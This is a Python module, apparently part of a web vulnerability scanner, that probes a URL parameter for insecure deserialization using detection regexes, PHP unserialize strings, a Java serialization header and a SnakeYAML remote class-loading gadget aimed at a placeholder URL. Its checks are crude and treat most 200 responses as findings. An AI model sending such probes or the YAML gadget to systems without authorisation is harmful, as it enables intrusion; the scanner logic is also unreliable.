import re, base64
from typing import Optional, Dict
import requests

DESER_PATTERNS = [
    r'(?i)(java\.io\.Serializable|ObjectInputStream|readObject)',
    r'(?i)(yaml|snakeyaml|Yaml\.load)',
    r'(?i)(pickle|cPickle|__reduce__|__getstate__)',
    r'(?i)(php:\/\/|unserialize|O:\d+:"|s:\d+:")',
    r'(?i)(XMLDecoder|java\.beans\.XMLDecoder)',
    r'(?i)(Jackson|@JacksonInject|@JsonTypeInfo)',
    r'(?i)(FastJson|JSON\.parseObject|@JSONType)',
    r'(?i)(XStream|com\.thoughtworks\.xstream)',
]

PHP_UNSERIALIZE_PAYLOADS = [
    'O:7:"stdClass":0:{}',
    'a:1:{i:0;s:4:"test";}',
    'O:8:"stdClass":2:{s:4:"test";s:4:"test";}',
]

JAVA_SERIALIZED_MAGIC = "rO0ABQ=="


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": []}

    if url:
        try:
            r = sess.get(url, timeout=timeout, verify=False)
            for pat in DESER_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "source_code_leak"
                    result["evidence"].append("deser pattern: %s" % pat[:20])
                    break
        except:
            pass

    if param and not result["vulnerable"]:
        for payload in PHP_UNSERIALIZE_PAYLOADS:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
                if r.status_code == 200 and len(r.text) > 10:
                    result["vulnerable"] = True
                    result["type"] = "php_unserialize"
                    result["evidence"].append("php unserialize payload accepted: %s" % payload[:20])
                    break
            except:
                pass

    if param and not result["vulnerable"]:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, JAVA_SERIALIZED_MAGIC),
                         timeout=timeout, verify=False)
            if r.status_code != 404 and len(r.text) > 0:
                result["vulnerable"] = True
                result["type"] = "java_serialized"
                result["evidence"].append("java serialized object accepted")
        except:
            pass

    yaml_payload = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://test/\"]]]]"
    if param and not result["vulnerable"]:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, yaml_payload),
                         timeout=timeout, verify=False)
            if r.status_code == 200 and len(r.text) > 10:
                pass
        except:
            pass

    return result
